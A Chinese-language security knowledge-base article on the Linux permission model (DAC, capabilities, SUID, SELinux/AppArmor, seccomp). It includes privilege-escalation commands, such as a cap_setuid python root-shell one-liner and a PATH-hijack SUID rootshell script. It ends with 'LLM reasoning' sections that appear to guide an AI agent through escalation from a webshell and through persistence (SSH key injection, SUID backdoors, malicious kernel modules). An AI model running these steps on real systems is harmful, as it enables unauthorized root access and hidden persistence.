# Linux 进程权限模型与文件系统安全

> 知识库层级：Level 1 - 操作系统内核基础
> 日期：2026-06-04
> 来源：Linux man-pages, Elastic Security Labs, Juggernaut-Sec, Linux Kernel Docs

## 一、Linux 权限模型的三层架构

Linux 的权限检查从内到外有三层，每一层解决不同问题：

```
用户态程序请求操作
    │
    ▼
┌─────────────────────┐
│  Layer 1: DAC       │  ← 传统 Unix 权限（你是谁？）
│  Discretionary      │     基于 UID/GID + 文件 mode bits
│  Access Control     │     root 可以绕过（CAP_DAC_OVERRIDE）
└────────┬────────────┘
         │ 通过
         ▼
┌─────────────────────┐
│  Layer 2: 能力      │  ← 细粒度权限（你能做什么？）
│  Capabilities       │     将 root 拆分为 40+ 独立能力
│                     │     CAP_NET_RAW, CAP_SYS_ADMIN...
└────────┬────────────┘
         │ 通过
         ▼
┌─────────────────────┐
│  Layer 3: MAC       │  ← 强制访问控制（策略允许吗？）
│  Mandatory          │     SELinux/AppArmor
│  Access Control     │     系统管理员定义策略
└────────┬────────────┘
         │ 全部通过
         ▼
    操作执行
```

**顺序不可逆：** DAC 不通过就不会走到 Capabilities，Capabilities 不通过就不会走到 MAC。每一层检查的时间点不同。

### 核心原则：Everything Is a File

Linux 中几乎所有资源都抽象为文件描述符：
- 普通文件和数据目录
- socket（`/proc/<pid>/fd/` 可以看到）
- 管道和 FIFO
- 设备文件（`/dev/sda`）
- `/proc` 和 `/sys` 中的内核接口
- IPC 对象

这意味着文件权限模型（DAC）不仅仅是保护"文件"，而是保护了大部分系统资源。

---

## 二、Layer 1：DAC（自主访问控制）

### 2.1 传统 Unix 权限模型

每个文件有三个权限三元组：

```
-rwxr-xr--  1 root root  1024 Jun  4 10:00 /bin/ls
│││││││││
││││││││└── 其他人权限（other）
│││││││└─── 组权限（group）
││││││└──── 所有者权限（user）
│││││└───── 特殊位（setuid/setgid/sticky）
││││└────── 文件类型（- 普通文件，d 目录，l 链接...）
```

| 权限 | 文件 | 目录 |
|------|------|------|
| r (4) | 读取文件内容 | 列出目录内容（ls） |
| w (2) | 修改文件内容 | 创建/删除/重命名目录中的文件 |
| x (1) | 执行文件 | 进入目录（cd）/ 访问其中的文件 |

### 2.2 DAC 的权限检查路径

当进程访问一个文件时，内核中的检查流程（在 `fs/namei.c` 中）：

```
open("/etc/shadow", O_RDONLY)
    ↓
do_sys_open() → do_filp_open()
    ↓
path_openat() → lookup_open()
    ↓
vfs_open() → may_open()
    ↓
inode_permission() → __inode_permission()
    ↓
① ① 检查文件系统本身是否可读（sb_permission）
② ② generic_permission() → acl_permission_check()
    比较进程的 fsuid/fsgid 与文件的 uid/gid/mode
    如果进程是 root → 检查 CAP_DAC_OVERRIDE
    如果进程是文件所有者 → 用 owner 权限匹配
    如果进程在文件所属组 → 用 group 权限匹配
    否则 → 用 other 权限匹配
③ ③ 检查 POSIX ACL（如果有）
    ↓
LSM 钩子（如果启用）
```

**关键代码（generic_permission）：**

```c
int generic_permission(struct inode *inode, int mask)
{
    int ret;
    
    // 基本 DAC 权限检查
    ret = acl_permission_check(inode, mask);
    if (ret != -EACCES)
        return ret;

    // DAC 检查失败后，检查 capability 覆盖
    if (S_ISDIR(inode->i_mode)) {
        // 目录：CAP_DAC_OVERRIDE 和 CAP_DAC_READ_SEARCH
        if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
            return 0;
        if (!(mask & MAY_WRITE))
            if (capable_wrt_inode_uidgid(inode, CAP_DAC_READ_SEARCH))
                return 0;
    } else {
        // 文件：只有可执行位无法被 capability 覆盖
        if (!(mask & MAY_EXEC) || (inode->i_mode & S_IXUGO))
            if (capable_wrt_inode_uidgid(inode, CAP_DAC_OVERRIDE))
                return 0;
    }
    return -EACCES;
}
```

### 2.3 DAC 的固有缺陷

| 问题 | 表现 | 影响 |
|------|------|------|
| root 可以绕过一切 | root 有 CAP_DAC_OVERRIDE | 文件权限对 root 基本无效 |
| 粒度粗 | 按 user/group/other 三级 | 一个服务进程的所有文件访问权限相同 |
| 无应用隔离 | 两个进程同属一个用户 | 它们有完全相同的文件访问权限 |
| 不能撤销已打开的文件 | 打开文件后权限改变无效 | fd 传递后无法控制 |

---

## 三、Layer 2：Capabilities（细粒度能力）

### 3.1 为什么需要 Capabilities？

传统 Unix 中只有两种身份：普通用户（受限）和 root（全能）。但很多场景下，一个程序只需要 root 的一小部分能力：

| 场景 | 需要的能力 | 传统做法 | 现在做法 |
|------|-----------|---------|---------|
| ping 需要开 raw socket | CAP_NET_RAW | SUID root | 给 ping 设置 +cap_net_raw |
| NTP 需要改系统时间 | CAP_SYS_TIME | root 运行 | 给 ntpd 设置 +cap_sys_time |
| Web 服务器绑定低端口 | CAP_NET_BIND_SERVICE | root 启动后降权 | 文件能力 |

### 3.2 五种能力集

每个进程有 5 个能力位图：

```
Permitted (P)  ─── 进程允许拥有的最大能力集
    │
    ▼
Effective (E)  ─── 内核实际检查的能力集（当前生效的）
    │
Inheritable (I) ─── 子进程可以继承的能力
    │
Bounding (B)   ─── 系统级全局限制（所有进程都不能超越）
    │
Ambient (A)    ─── 非 SUID 程序中保留给普通用户的能力
```

**能力检查的逻辑：** 内核检查 `Effective` 集。如果有该能力，操作允许；否则拒绝。

### 3.3 文件能力（File Capabilities）

能力可以设置在可执行文件上（类似 SUID，但更精细）：

```bash
# 给 python3 设置 cap_setuid，使它可以切换用户 ID
setcap cap_setuid+ep /usr/bin/python3

# 查看文件的能力
getcap /usr/bin/python3
# 输出: /usr/bin/python3 = cap_setuid+ep
```

`+ep` 的含义：
- `e`（Effective）：执行时自动进入 Effective 集
- `p`（Permitted）：执行时自动进入 Permitted 集

### 3.4 关键能力的攻击面

以下 6 个能力是提权攻击中最常被滥用的：

| 能力 | 正常用途 | 被滥用时的效果 |
|------|---------|---------------|
| **CAP_DAC_READ_SEARCH** | 允许读任何文件 | 可以读 `/etc/shadow` |
| **CAP_DAC_OVERRIDE** | 允许写任何文件 | 可以修改 `/etc/passwd`、给 `/bin/bash` 设 SUID |
| **CAP_CHOWN** | 允许改文件所有者 | `chown root:root /tmp/shell` |
| **CAP_FOWNER** | 允许改文件权限 | `chmod 4755 /bin/bash` → SUID shell |
| **CAP_SETUID** | 允许切换 UID | `python3 -c 'os.setuid(0); os.system("/bin/bash")'` |
| **CAP_SYS_ADMIN** | 系统管理大杂烩 | mount、namespace 操作等（最危险，应避免使用） |

**真实攻击示例（cap_setuid）：**

```bash
# 攻击者发现 python3 被设置了 cap_setuid+ep
# 只需一行代码即可提权 root：
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
# 运行后 id 显示 uid=0(root)！
```

### 3.5 SUID vs Capabilities vs Sudo

| 机制 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| **SUID** | 执行时以文件拥有者身份运行 | 简单、广泛使用 | 一发权限全部，太多 SUID 二进制扩大了攻击面 |
| **Capabilities** | 只授予需要的能力 | 最小权限原则 | 配置复杂、不易审计 |
| **Sudo** | 基于配置的策略授权 | 灵活、可审计 | 依赖配置正确，sudoers 易出错 |

---

## 四、SUID/SGID/Sticky 位

### 4.1 SUID（Set User ID）— 权限 4xxx

```
chmod 4755 /usr/bin/su
# 4 = SUID
# 755 = rwxr-xr-x
```

**原理：** 当用户执行一个 SUID 文件时，进程的 Effective UID 被设置为文件所有者（通常是 root），而不是执行者的 UID。这使得普通用户可以暂时获得 root 权限执行特定程序。

**内核中的实现（一个简化视角）：**

```c
// 在 execve() 系统调用中
static int exec_binprm(struct linux_binprm *bprm)
{
    // ...
    // 如果文件有 SUID 位
    if (bprm->file->f_path.mnt->mnt_flags & MNT_NOSUID)
        goto nosuid;  // 挂载时使用 nosuid 选项则跳过
    
    if (bprm->file->f_inode->i_mode & S_ISUID) {
        // 设置进程的 Effective UID 为文件所有者
        bprm->cred->euid = bprm->file->f_inode->i_uid;
    }
    // ...
}
```

### 4.2 危险的 SUID 二进制模式

一个二进制文件如果有 SUID root 属性，并且存在漏洞（如命令注入、文件读取），就可能导致提权：

```
/bin/su, /usr/bin/sudo        → 设计上就需要 SUID（但不危险）
/bin/mount, /bin/umount       → 需要 SUID，历史上出过漏洞
/usr/bin/pkexec               → Polkit 漏洞（CVE-2021-4034）
/usr/lib/dbus-1.0/dbus-daemon → D-Bus 守护进程
/usr/bin/cve-check-tool       → 配置不当可能危险
```

### 4.3 提权中的 SUID 利用

```
攻击者找到 SUID 二进制 → 检查该程序的行为
    → 发现该程序调用了 system()/exec() 
    → 程序没有清理 PATH 或环境变量
    → 攻击者修改 PATH 指向恶意程序
    → SUID 二进制以 root 权限执行恶意程序
    → 提权成功
```

或者更典型的：

```bash
# 找到所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 检查 /usr/bin/cve-check 是否有漏洞
# 本例中它不安全地执行外部命令
HACK=/tmp/evil
echo '#!/bin/bash' > $HACK
echo 'cp /bin/bash /tmp/rootshell' >> $HACK
echo 'chmod 4755 /tmp/rootshell' >> $HACK
chmod +x $HACK
# 修改 PATH 让 SUID 程序执行我们的恶意脚本
PATH=/tmp:$PATH /usr/bin/cve-check --update
/tmp/rootshell -p  # 成功获得 root shell
```

---

## 五、Layer 3：LSM（Linux 安全模块）

LSM 是内核中一个框架，在关键操作点插入钩子（hooks），允许安全模块在这些钩子上执行额外的检查。

### 5.1 LSM 架构

```
用户态系统调用
    ↓
内核函数（如 inode_permission）
    ↓
传统 DAC 检查 ← 第一道防线
    ↓
LSM 钩子 ← 第二道防线
    ↓
┌────────┬────────┬────────┐
│SELinux │AppArmor│ 其他   │
│(RHEL)  │(Ubuntu)│ (Smack)│
└────────┴────────┴────────┘
```

### 5.2 主要 LSM 实现

| LSM | 特点 | 使用场景 |
|-----|------|---------|
| **SELinux** | 基于标签（Label）的 MAC，每个文件/进程都有安全上下文 | RHEL/CentOS/Fedora |
| **AppArmor** | 基于路径的 MAC，通过配置文件定义程序可访问的资源 | Ubuntu/Debian |
| **Smack** | 简化的 SELinux，用于嵌入式系统 | Tizen、IoT |
| **TOMOYO** | 基于行为学习的 MAC | 企业定制系统 |
| **Yama** | 限制 ptrace 能力 | 所有发行版（默认） |

### 5.3 Yama — ptrace 限制

尽管 Yama 不像 SELinux 那样显眼，但它是最广泛使用的 LSM 之一。

**作用：** 控制 `ptrace()` 系统调用的使用。ptrace 可以附加到另一个进程，读取/修改其内存和寄存器——这是提权攻击中常用的技术。

```
Yama ptrace_scope:
  0 = 任何进程可以 ptrace 任何同 uid 进程（传统行为）
  1 = 只能 ptrace 子进程（默认值）
  2 = 只有 CAP_SYS_PTRACE 可以 ptrace（管理员设置）
  3 = 完全禁用 ptrace（最严格）
```

### 5.4 Seccomp — 系统调用过滤

虽然 Seccomp 不是 LSM，但它同样在内核的 syscall 入口处做检查：

```
用户态 → syscall 指令
    → 内核入口（entry_SYSCALL_64）
    → Seccomp 过滤器（基于 BPF 规则）
        → 允许：继续执行 syscall handler
        → 拒绝：返回错误（-EPERM）或杀死进程
        → 捕获：通知追踪器进程
    → 正常系统调用处理
```

**常用 seccomp 模式：**
- **strict:** 只允许 `read`, `write`, `_exit`, `sigreturn` 四个 syscall
- **filter:** 用户自定义 BPF 规则（Docker、Chrome 使用此模式）

---

## 六、攻击面综合分析

### 6.1 从 Linux 权限模型推导漏洞类型

| 攻击类型 | 底层机制 | 绕过方法 |
|----------|----------|----------|
| SUID 提权 | EUID 在 exec 时被提升 | 利用 SUID 程序中的命令注入 |
| 能力滥用 | 文件能力设置不当 | 利用 python/perl 的 cap_setuid |
| 竞态条件 (TOCTOU) | 文件权限检查和使用之间有时差 | `access()` → `open()` 之间的窗口期 |
| Symlink 攻击 | 在敏感目录中创建符号链接 | 欺骗 SUID 程序操作错误文件 |
| /proc 信息泄露 | /proc 文件系统暴露了进程信息 | 读取其他进程的内存/cwd/env |
| Seccomp 绕过 | 只过滤了已知危险的 syscall | 使用新的/异常的 syscall 组合 |
| 容器逃逸 | Namespace 不是安全边界 | 共享内核 + 内核漏洞 |

### 6.2 常见提权路径

```
获得低权限 shell
    ↓
枚举（手动或工具）
    ① SUID 二进制 find / -perm -4000
    ② Sudo 配置 sudo -l
    ③ Capabilities getcap -r /
    ④ 内核版本 uname -a
    ⑤ Crontab、服务、网络监听
    ↓
发现一个可利用目标
    ↓
利用：
    GTFOBins 查 SUID 二进制可被利用的方式
    → 或使用内核 exploit
    → 或利用配置错误的 capabilities
    → 或利用 sudo 规则中的漏洞
    ↓
获得 root shell
```

### 6.3 关键洞察：什么是"从原理推导"

传统的安全工程师知道：
- `/usr/bin/python3` 有 cap_setuid → 提权
- 但为什么？因为 `os.setuid(0)` 系统调用会检查 `CAP_SETUID`

**从原理推导的工程师会想：**
```
"这个程序有 cap_setuid
→ 意味着它的 effective 能力集中有 CAP_SETUID
→ CAP_SETUID 允许调用 setuid(2) 系统调用
→ setuid(2) 在内核中修改 current->cred->uid
→ 修改后内核以新的 UID 检查后续操作
→ 如果改成 0（root），后续操作不受 DAC 限制
→ 提权成功"

在此基础上进一步推演：
"除了 setuid(2)，CAP_SETUID 还允许什么？
还允许 setreuid(2), setresuid(2), setfsuid(2)
还允许通过 UNIX domain socket 伪造 UID
还允许在 user namespace 中写 UID 映射"

"有没有其他"细粒度能力"同理被忽略的？
→ CAP_DAC_READ_SEARCH 允许读任何文件
→ CAP_SYS_ADMIN 允许 mount
→ CAP_NET_RAW 允许构造任意网络包"
```

这就是 **"理解原理 → 系统性发现攻击面"** 和"记住已知漏洞"的区别。

---

**下一层：** 理解了操作系统权限模型后，下一步是"网络协议安全"——从 TCP 三次握手开始，逐层向上理解 HTTP/TLS/DNS 协议的设计漏洞。


---

## 【LLM 推理段 — Linux 提权检测】

### 触发条件
- 已获得目标系统低权限 shell 或 Webshell
- 需要从 www-data/普通用户提权到 root

### 检测信号
| 类型 | 检查内容 | 置信度 | 检查方法 |
|------|---------|--------|---------|
| SUID 文件 | find / -perm -4000 2>/dev/null | 高 | 查找特殊权限二进制 |
| SUDO 配置 | sudo -l | 高 | 检查可免密执行的命令 |
| Capabilities | getcap -r / 2>/dev/null | 中 | 查找特殊能力文件 |
| 内核版本 | uname -a | 中 | 匹配已知内核提权 CVE |
| 计划任务 | ls -la /etc/cron* | 中 | 检查可写脚本 |
| 可写文件 | find / -writable -type f 2>/dev/null | 中 | 可修改系统文件 |

### 验证步骤（按优先级）
1. **SUID 提权**: 查找 SUID 二进制 -> 对比 GTFOBins -> 利用已知提权路径
2. **sudo 提权**: `sudo -l` -> 找到免密/免完整密码的命令 -> GTFOBins 利用
3. **内核提权**: uname -a -> 匹配 CVE -> 下载对应 exploit
4. **计划任务**: 检查可写脚本 -> 注入恶意命令 -> 等待任务触发
5. **Docker 组**: `groups` -> 如果在 docker 组内 -> docker run -v /:/host 逃逸

### 利用链扩展
| 条件 | 提权方式 | 后续 |
|------|---------|------|
| SUID 二进制 | GTFOBins 利用 | 完全 root |
| sudo 免密 | 执行 GTFOBins 命令 | 完全 root |
| 内核版本 | 对应 exploit | 完全 root |
| 可写计划任务 | 注入恶意脚本 | 完全 root |
| Docker 组 | 挂载宿主机启动容器 | 宿主机控制 |

### 常见误判
- SUID 文件存在不代表可利用 -> 需要检查 GTFOBins 是否有提权路径
- 内核版本新不一定没有提权漏洞 -> 检查最近 CVE
- sudo -l 显示有命令但可能限制了参数 -> 需要检查允许的参数范围

---

## 【LLM 推理段 — Linux 权限维持检测】

### 触发条件
- 已获得 root 权限，需要维持访问

### 常见方法
1. SSH 公钥注入: 写公钥到 /root/.ssh/authorized_keys
2. Cron 持久化: 写入 /etc/cron.d/ 或 /var/spool/cron/
3. Systemd 服务: 创建恶意 service 文件
4. SUID 后门: cp /bin/bash /tmp/.bash && chmod u+s /tmp/.bash
5. LD_PRELOAD: 设置 LD_PRELOAD 环境变量
6. 内核模块: 加载恶意 LKM

### 检测方法
- 检查最近修改的文件: find / -mtime -1 -type f 2>/dev/null
- 检查新增系统用户: cat /etc/passwd | tail -20
- 检查新增 SSH 密钥: cat /root/.ssh/authorized_keys
- 检查隐藏进程: ps aux | grep -v '^\['
